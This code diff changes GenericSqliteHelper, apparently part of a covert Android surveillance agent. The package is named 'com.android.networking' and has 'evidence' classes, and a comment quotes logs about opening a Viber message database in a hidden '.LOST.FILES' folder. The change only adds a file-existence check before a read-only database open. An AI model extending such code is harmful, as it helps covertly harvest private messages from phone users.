@@ -14,6 +14,7 @@ import com.android.networking.Status;
 import com.android.networking.auto.Cfg;
 import com.android.networking.evidence.EvidenceReference;
 import com.android.networking.evidence.EvidenceType;
+import com.android.networking.file.AutoFile;
 import com.android.networking.file.Path;
 import com.android.networking.util.Check;
 import com.android.networking.util.Utils;
@@ -214,15 +215,33 @@ public class GenericSqliteHelper { // extends SQLiteOpenHelper {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getReadableDatabase) open");
 			}
-			SQLiteDatabase opened = SQLiteDatabase.openDatabase(name, null, SQLiteDatabase.OPEN_READONLY
-					| SQLiteDatabase.NO_LOCALIZED_COLLATORS);
-			return opened;
+			// TODO: verificare se sia possibile evitare i log:
+			// 06-17 11:13:17.726: E/SqliteDatabaseCpp(10522):
+			// sqlite3_open_v2("/mnt/sdcard/.LOST.FILES/mdd/viber_messages",
+			// &handle, 1, NULL) failed
+			// 06-17 11:13:17.742: E/SQLiteDatabase(10522): Failed to open the
+			// database. closing it.
+			// 06-17 11:13:17.742: E/SQLiteDatabase(10522):
+			// android.database.sqlite.SQLiteCantOpenDatabaseException: unable
+			// to open database file
+
+			AutoFile file = new AutoFile(name);
+			if (file.exists()) {
+				SQLiteDatabase opened = SQLiteDatabase.openDatabase(name, null, SQLiteDatabase.OPEN_READONLY
+						| SQLiteDatabase.NO_LOCALIZED_COLLATORS);
+				return opened;
+			}else{
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getReadableDatabase) Error: file does not exists");
+				}
+			}
 		} catch (Throwable ex) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getReadableDatabase) Error: " + ex);
 			}
-			return null;
 		}
+		
+		return null;
 	}
 
 	public void deleteDb() {
